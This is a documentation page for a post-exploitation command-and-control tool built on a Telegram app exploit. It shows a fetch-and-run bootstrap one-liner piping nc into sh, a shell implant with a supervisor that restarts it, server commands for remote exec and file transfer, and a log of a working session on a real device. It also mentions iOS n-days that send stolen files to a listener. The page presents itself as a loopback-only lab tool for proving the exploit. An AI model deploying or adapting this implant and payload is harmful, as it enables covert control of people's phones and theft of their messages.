# C2 and post-exploitation

The exploit ends with native code execution as the Telegram app UID. This page
describes the local command-and-control layer used to prove it. It is a lab
tool, not a persistence product.

## Design

- **Local only.** The server binds `127.0.0.1` or a private LAN address. It
  refuses non-private binds and peers. No public tunnel, no cloud relay.
- **One-shot entry.** The exploit's `system()` command is a short loopback
  bootstrap:
  ```
  setsid sh -c 'sleep 5|nc 127.0.0.1 5555|sh'&
  ```
  `setsid` detaches the pipeline so `system()` returns immediately. `sleep 5`
  holds `toybox nc`'s stdin open. `| sh` runs the bootstrap served on the
  loader port.
- **Two ports.** Control (JSON-lines) and loader (the bootstrap script).
  On Android, `adb reverse tcp:4444 tcp:4444` and
  `adb reverse tcp:5555 tcp:5555` map them to the host.
- **Implant.** A POSIX `sh` / toybox loop. It uses two pre-opened FIFOs and
  `toybox nc`. It runs as the app UID.
- **Supervisor.** Restarts a dead implant with backoff and re-hellos after an
  app PID change. It survives an app crash, not `am force-stop` or a reboot.

## Protocol

JSON-lines. Commands and paths are base64 so shell metacharacters cannot break
the framing. `exec` streams `out`/`err` chunks and reports the real `rc`.
`put`/`get` are chunked with sha256. The server pings every 30 s; the implant
reconnects after a 75 s receive timeout.

## Server

```sh
python3 docs/c2/c2560s/server/c2_server.py \
  --host 127.0.0.1 --port 4444 --loader-port 5555 \
  --bootstrap nc --token <TOKEN> \
  --wait-session 180 --cmd sessions --cmd "exec id"
```

CLI: `sessions`, `use <sid>`, `info`, `ping`, `exec <cmd>`, `put`, `get`,
`sleep`, `reconnect`, `bye [stop]`, `broadcast exec`, `wait`. Batch mode:
`--cmd` (repeatable) or `--script ops.txt`.

## Bootstrap

```sh
python3 docs/c2/c2560s/tools/make_bootstrap.py \
  --host 127.0.0.1 --port 5555 --token <TOKEN>
```

The bootstrap renders the host/port/token/build placeholders. The loader port
serves it once per fetch. Repeat fetches answer `C2_BOOTSTRAP_BUSY` or
`C2_ALREADY_RUNNING`; a chat scroll can produce ~30 fetches.

## Proven session

Sony XQ-BT52, beta 72929, 2026-11-07 23:52:46:

```
session 1 hello implant=tg-10346-XQ-BT52 uid=10346 user=u0_a346 device=XQ-BT52 from=127.0.0.1
uid=10346(u0_a346) ... context=u:r:untrusted_app:s0:c90,c257,c512,c768
[exec rc=0 0.52s]
```

Timing on 2026-11-08: **1.913 s** from message open to the `hello`; `exec id`
output at 3.163 s.

## iOS

The iOS app sandbox denies `fork`, `posix_spawn`, and `execve`. There is no
shell. The iOS endgame uses `open`/`read`/`write`/`socket`/`connect` in-process:

- the 6s n-day wrote a local `RCE_OK` file;
- the 17e n-day read a file and sent it to a local listener.

`docs/c2/ios-1827/` contains the listener and the DB decode/export helpers.

## Persistence limits (measured)

- Survives an app crash (`setsid` + supervisor).
- Does **not** survive `am force-stop` or an app kill. Android kills the UID
  cgroup; there is no non-root workaround.
- Nothing survives a reboot.
- App UID only; LAN only; no root.
- The app freezer can pause the C2 when Telegram is backgrounded.

## Safety

- The loader port has no TCP auth (the token is inside the served script). Use
  loopback or a trusted LAN only.
- Do not expose the ports to the internet.
- Do not commit the token.
- Do not run the C2 against a device you do not own.
